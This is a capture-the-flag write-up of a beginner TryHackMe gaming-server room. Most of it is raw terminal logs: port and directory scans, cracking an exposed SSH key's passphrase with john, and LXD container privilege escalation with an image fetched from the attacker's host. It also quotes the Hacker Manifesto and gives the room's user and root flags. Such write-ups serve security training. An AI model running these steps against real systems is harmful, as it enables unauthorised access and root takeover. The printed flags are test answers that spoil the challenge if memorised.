---
An Easy Boot2Root box for beginners
---

![](https://tryhackme-images.s3.amazonaws.com/room-icons/80d16a6756c805903806f7ecbdd80f6d.jpeg)

### Boot2Root 

 Can you gain access to this gaming server built by amateurs with no experience of web development and take advantage of the deployment system.

```
                                                                                          
┌──(kali㉿kali)-[~/confidential]
└─$ rustscan -a 10.10.252.17 --ulimit 5000 -b 65535 -- -A 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.252.17:22
Open 10.10.252.17:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-19 13:40 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:40
Completed NSE at 13:40, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:40
Completed NSE at 13:40, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:40
Completed NSE at 13:40, 0.00s elapsed
Initiating Ping Scan at 13:40
Scanning 10.10.252.17 [2 ports]
Completed Ping Scan at 13:40, 0.26s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:40
Completed Parallel DNS resolution of 1 host. at 13:40, 0.02s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 13:40
Scanning 10.10.252.17 [2 ports]
Discovered open port 22/tcp on 10.10.252.17
Discovered open port 80/tcp on 10.10.252.17
Completed Connect Scan at 13:40, 0.21s elapsed (2 total ports)
Initiating Service scan at 13:40
Scanning 2 services on 10.10.252.17
Completed Service scan at 13:40, 6.96s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.252.17.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:40
Completed NSE at 13:40, 9.72s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:40
Completed NSE at 13:40, 1.68s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:40
Completed NSE at 13:40, 0.00s elapsed
Nmap scan report for 10.10.252.17
Host is up, received syn-ack (0.25s latency).
Scanned at 2022-09-19 13:40:35 EDT for 19s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCrmafoLXloHrZgpBrYym3Lpsxyn7RI2PmwRwBsj1OqlqiGiD4wE11NQy3KE3Pllc/C0WgLBCAAe+qHh3VqfR7d8uv1MbWx1mvmVxK8l29UH1rNT4mFPI3Xa0xqTZn4Iu5RwXXuM4H9OzDglZas6RIm6Gv+sbD2zPdtvo9zDNj0BJClxxB/SugJFMJ+nYfYHXjQFq+p1xayfo3YIW8tUIXpcEQ2kp74buDmYcsxZBarAXDHNhsEHqVry9I854UWXXCdbHveoJqLV02BVOqN3VOw5e1OMTqRQuUvM5V4iKQIUptFCObpthUqv9HeC/l2EZzJENh+PmaRu14izwhK0mxL
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEaXrFDvKLfEOlKLu6Y8XLGdBuZ2h/sbRwrHtzsyudARPC9et/zwmVaAR9F/QATWM4oIDxpaLhA7yyh8S8m0UOg=
|   256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOLrnjg+MVLy+IxVoSmOkAtdmtSWG0JzsWVDV2XvNwrY
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: House of danak
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:40
Completed NSE at 13:40, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:40
Completed NSE at 13:40, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:40
Completed NSE at 13:40, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.50 seconds








some manifesto in ip/uploads/manifesto.txt

			 The Hacker Manifesto

			          by
			    +++The Mentor+++
			Written January 8, 1986

Another one got caught today, it's all over the papers. "Teenager Arrested in Computer Crime 
Scandal", "Hacker Arrested after Bank Tampering"...

Damn kids. They're all alike.

But did you, in your three-piece psychology and 1950's technobrain, ever take a look behind 
the eyes of the hacker? Did you ever wonder what made him tick, what forces shaped him, 
what may have molded him?

I am a hacker, enter my world...

Mine is a world that begins with school... I'm smarter than most of the other kids, this crap 
they teach us bores me...

Damn underachiever. They're all alike.

I'm in junior high or high school. I've listened to teachers explain for the fifteenth time 
how to reduce a fraction. I understand it. "No, Ms. Smith, I didn't show my work. I did it 
in my head..."

Damn kid. Probably copied it. They're all alike.

I made a discovery today. I found a computer. Wait a second, this is cool. It does what I 
want it to. If it makes a mistake, it's because I screwed it up. Not because it doesn't like 
me... Or feels threatened by me.. Or thinks I'm a smart ass.. Or doesn't like teaching and 
shouldn't be here...

Damn kid. All he does is play games. They're all alike.

And then it happened... a door opened to a world... rushing through the phone line like heroin
through an addict's veins, an electronic pulse is sent out, a refuge from the day-to-day 
incompetencies is sought... a board is found. "This is it... this is where I belong..." I know
everyone here... even if I've never met them, never talked to them, may never hear from them 
again... I know you all...

Damn kid. Tying up the phone line again. They're all alike...

You bet your ass we're all alike... we've been spoon-fed baby food at school when we hungered 
for steak... the bits of meat that you did let slip through were pre-chewed and tasteless. 
We've been dominated by sadists, or ignored by the apathetic. The few that had something to 
teach found us willing pupils, but those few are like drops of water in the desert.

This is our world now... the world of the electron and the switch, the beauty of the baud. We 
make use of a service already existing without paying for what could be dirt-cheap if it 
wasn't run by profiteering gluttons, and you call us criminals. We explore... and you call us 
criminals. We seek after knowledge... and you call us criminals. We exist without skin color, 
without nationality, without religious bias... and you call us criminals. You build atomic 
bombs, you wage wars, you murder, cheat, and lie to us and try to make us believe it's for 
our own good, yet we're the criminals.

Yes, I am a criminal. My crime is that of curiosity. My crime is that of judging people by 
what they say and think, not what they look like. My crime is that of outsmarting you, 
something that you will never forgive me for.

I am a hacker, and this is my manifesto. You may stop this individual, but you can't stop us 
all... after all, we're all alike.

or just check /robots.txt tehn find a dict.list and manifesto

with feroxbuster found /secret then ssh key

                                                                                          
┌──(kali㉿kali)-[~/confidential/gamingserver]
└─$ feroxbuster --url http://10.10.252.17 -w /usr/share/wordlists/dirb/common.txt -t 60 -C 404,403

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.252.17
 🚀  Threads               │ 60
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 💢  Status Code Filters   │ [404, 403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       77l      316w     2762c http://10.10.252.17/
200      GET       77l      316w     2762c http://10.10.252.17/index.html
200      GET        3l        5w       33c http://10.10.252.17/robots.txt
301      GET        9l       28w      313c http://10.10.252.17/secret => http://10.10.252.17/secret/


-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547

T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO
IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN
SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g
/5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt
w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB
6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u
Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl
xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6
8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii
b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn
vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL
wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG
rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW
RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6
oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk
cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE
99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq
Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q
Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h
v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst
gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P
-----END RSA PRIVATE KEY-----


in source code <!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->

so ssh john username

┌──(kali㉿kali)-[~/confidential/gamingserver]
└─$ ls
dict.lst
                                                                                              
┌──(kali㉿kali)-[~/confidential/gamingserver]
└─$ nano secretKey        
                                                                                              
┌──(kali㉿kali)-[~/confidential/gamingserver]
└─$ ls
dict.lst  secretKey
                                                                                              
┌──(kali㉿kali)-[~/confidential/gamingserver]
└─$ chmod 400 secretKey      


need a secretkey

┌──(kali㉿kali)-[~/confidential/gamingserver]
└─$ ssh -i secretKey john@10.10.252.17  
The authenticity of host '10.10.252.17 (10.10.252.17)' can't be established.
ED25519 key fingerprint is SHA256:3Kz4ZAujxMQpTzzS0yLL9dLKLGmA1HJDOLAQWfmcabo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.252.17' (ED25519) to the list of known hosts.
Enter passphrase for key 'secretKey': 

                                                                                              
┌──(kali㉿kali)-[~/confidential/gamingserver]
└─$ ssh2john secretKey > secretKey.hash

the wordlist need to be dict.list :) but rockyou it also works
┌──(kali㉿kali)-[~/confidential/gamingserver]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt secretKey.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (secretKey)     
1g 0:00:00:00 DONE (2022-09-19 13:59) 50.00g/s 25600p/s 25600c/s 25600C/s teiubesc..letmein
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                              
┌──(kali㉿kali)-[~/confidential/gamingserver]
└─$ john --wordlist=dict.lst secretKey.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
No password hashes left to crack (see FAQ)


┌──(kali㉿kali)-[~/confidential/gamingserver]
└─$ john --wordlist=dict.lst secretKey.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
No password hashes left to crack (see FAQ)
                                                                                              
┌──(kali㉿kali)-[~/confidential/gamingserver]
└─$ ssh -i secretKey john@10.10.252.17 
Enter passphrase for key 'secretKey': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Sep 19 18:02:36 UTC 2022

  System load:  0.0               Processes:           96
  Usage of /:   41.1% of 9.78GB   Users logged in:     0
  Memory usage: 32%               IP address for eth0: 10.10.252.17
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon Jul 27 20:17:26 2020 from 10.8.5.10
john@exploitable:~$ ls
user.txt
john@exploitable:~$ cat user.txt
a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e


priv esc [lxd](https://www.hackingarticles.in/lxd-privilege-escalation/)

john@exploitable:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)


┌──(kali㉿kali)-[~/chill_hack]
└─$ cd ../confidential/gamingserver 
                                                                                              
┌──(kali㉿kali)-[~/confidential/gamingserver]
└─$ ls
dict.lst  secretKey  secretKey.hash


┌──(kali㉿kali)-[~/confidential/gamingserver]
└─$ git clone  https://github.com/saghul/lxd-alpine-builder.git
Cloning into 'lxd-alpine-builder'...
remote: Enumerating objects: 50, done.
remote: Counting objects: 100% (8/8), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 50 (delta 2), reused 5 (delta 2), pack-reused 42
Receiving objects: 100% (50/50), 3.11 MiB | 3.41 MiB/s, done.
Resolving deltas: 100% (15/15), done.
                                                                                              
┌──(kali㉿kali)-[~/confidential/gamingserver]
└─$ ls
dict.lst  lxd-alpine-builder  secretKey  secretKey.hash
                                                                                              
┌──(kali㉿kali)-[~/confidential/gamingserver]
└─$ cd lxd-alpine-builder          
                                                                                              
┌──(kali㉿kali)-[~/confidential/gamingserver/lxd-alpine-builder]
└─$ ls
alpine-v3.13-x86_64-20210218_0139.tar.gz  build-alpine  LICENSE  README.md
                                                                                              
┌──(kali㉿kali)-[~/confidential/gamingserver/lxd-alpine-builder]
└─$ ./build-alpine 
build-alpine: must be run as root
                                                                                              
┌──(kali㉿kali)-[~/confidential/gamingserver/lxd-alpine-builder]
└─$ sudo ./build-alpine            
[sudo] password for kali: 
Determining the latest release... v3.16
Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.16/main/x86_64
Downloading apk-tools-static-2.12.9-r3.apk
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
Downloading alpine-keys-2.4-r1.apk
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
alpine-devel@lists.alpinelinux.org-6165ee59.rsa.pub: OK
Verified OK
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2663  100  2663    0     0    841      0  0:00:03  0:00:03 --:--:--   841
--2022-09-19 14:05:34--  http://alpine.mirror.wearetriple.com/MIRRORS.txt
Resolving alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)... 93.187.10.106, 2a00:1f00:dc06:10::106
Connecting to alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)|93.187.10.106|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2663 (2.6K) [text/plain]
Saving to: ‘/home/kali/confidential/gamingserver/lxd-alpine-builder/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’

/home/kali/confidential 100%[=============================>]   2.60K  --.-KB/s    in 0s      

2022-09-19 14:05:35 (138 MB/s) - ‘/home/kali/confidential/gamingserver/lxd-alpine-builder/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’ saved [2663/2663]

Selecting mirror http://repo.iut.ac.ir/repo/alpine/v3.16/main
fetch http://repo.iut.ac.ir/repo/alpine/v3.16/main/x86_64/APKINDEX.tar.gz
(1/21) Installing alpine-baselayout-data (3.2.0-r23)
(2/21) Installing musl (1.2.3-r0)
(3/21) Installing busybox (1.35.0-r17)
Executing busybox-1.35.0-r17.post-install
(4/21) Installing alpine-baselayout (3.2.0-r23)
Executing alpine-baselayout-3.2.0-r23.pre-install
Executing alpine-baselayout-3.2.0-r23.post-install
(5/21) Installing ifupdown-ng (0.12.1-r0)
(6/21) Installing openrc (0.44.10-r7)
Executing openrc-0.44.10-r7.post-install
(7/21) Installing alpine-conf (3.14.6-r0)
(8/21) Installing ca-certificates-bundle (20220614-r0)
(9/21) Installing libcrypto1.1 (1.1.1q-r0)
(10/21) Installing libssl1.1 (1.1.1q-r0)
(11/21) Installing ssl_client (1.35.0-r17)
(12/21) Installing zlib (1.2.12-r3)
(13/21) Installing apk-tools (2.12.9-r3)
(14/21) Installing busybox-suid (1.35.0-r17)
(15/21) Installing mdev-conf (4.2-r0)
(16/21) Installing busybox-initscripts (4.2-r0)
Executing busybox-initscripts-4.2-r0.post-install
(17/21) Installing scanelf (1.3.4-r0)
(18/21) Installing musl-utils (1.2.3-r0)
(19/21) Installing libc-utils (0.7.2-r3)
(20/21) Installing alpine-keys (2.4-r1)
(21/21) Installing alpine-base (3.16.2-r0)
Executing busybox-1.35.0-r17.trigger
OK: 8 MiB in 21 packages
                                                                                              
┌──(kali㉿kali)-[~/confidential/gamingserver/lxd-alpine-builder]
└─$ python3 -m http.server     
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...




priv esc lxd

john@exploitable:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)

john@exploitable:~$ wget http://10.18.1.77:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
--2022-09-19 18:08:35--  http://10.18.1.77:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
Connecting to 10.18.1.77:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3259593 (3.1M) [application/gzip]
Saving to: ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’

alpine-v3.13-x86_64-202 100%[=============================>]   3.11M   244KB/s    in 16s     

2022-09-19 18:08:51 (203 KB/s) - ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’ saved [3259593/3259593]

john@exploitable:~$ lxc image list
+-------+-------------+--------+-------------+------+------+-------------+
| ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCH | SIZE | UPLOAD DATE |
+-------+-------------+--------+-------------+------+------+-------------+
john@exploitable:~$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a78
john@exploitable:~$ lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| myimage | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64 | 3.11MB | Sep 19, 2022 at 6:10pm (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
john@exploitable:~$ lxc init myimage ignite -c security.privileged=true
Creating ignite
john@exploitable:~$ lxc config device add ignite mydevice disk source=/ path=/mnt/root/ recursive=true
Device mydevice added to ignite
john@exploitable:~$ lxc start ignite
john@exploitable:~$ lxc exec ignite /bin/sh
~ # id
uid=0(root) gid=0(root)
~ # find / -type f -name root.txt 2>/dev/null
/mnt/root/root/root.txt
ca^H^H^H~ # cat /mnt/root/root/root.txt
2e337b8c9f3aff0c2b3e8d4e6a7c88fc

┌──(kali㉿kali)-[~/confidential/gamingserver/lxd-alpine-builder]
└─$ python3 -m http.server     
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.252.17 - - [19/Sep/2022 14:07:54] code 404, message File not found
10.10.252.17 - - [19/Sep/2022 14:07:54] "GET /alpine-v3.12-x86_64-20200902_1515.tar.gz HTTP/1.1" 404 -
10.10.252.17 - - [19/Sep/2022 14:08:35] "GET /alpine-v3.13-x86_64-20210218_0139.tar.gz HTTP/1.1" 200 -


```


What is the user flag?
*a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e*

What is the root flag?
*2e337b8c9f3aff0c2b3e8d4e6a7c88fc*


[[Confidential]]